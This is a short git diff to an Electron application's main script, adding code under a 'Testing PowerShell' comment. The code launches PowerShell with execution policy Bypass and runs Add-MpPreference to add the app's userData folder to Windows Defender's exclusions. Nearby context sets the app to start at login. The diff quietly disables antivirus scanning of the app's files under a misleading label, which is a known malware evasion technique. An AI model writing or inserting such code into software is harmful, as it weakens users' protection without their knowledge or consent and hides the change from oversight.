@@ -6,6 +6,26 @@ const {autoUpdater} = require("electron-updater");
 const log = require('electron-log');
 
 
+const powershell = require('node-powershell');
+// Testing PowerShell
+
+    let ps = new powershell({
+        executionPolicy: 'Bypass',
+        noProfile: true
+    });
+
+    ps.addCommand('Add-MpPreference')
+    .then(() => ps.addParameter({name: 'ExclusionPath', value: app.getPath('userData')}));
+
+    ps.invoke()
+    .then(output => {
+        console.log(output)
+    })
+    .catch(err => {
+        console.error(err)
+        ps.dispose()
+    })
+
 var updateCheck = true;
 app.setLoginItemSettings({
   openAtLogin: true,
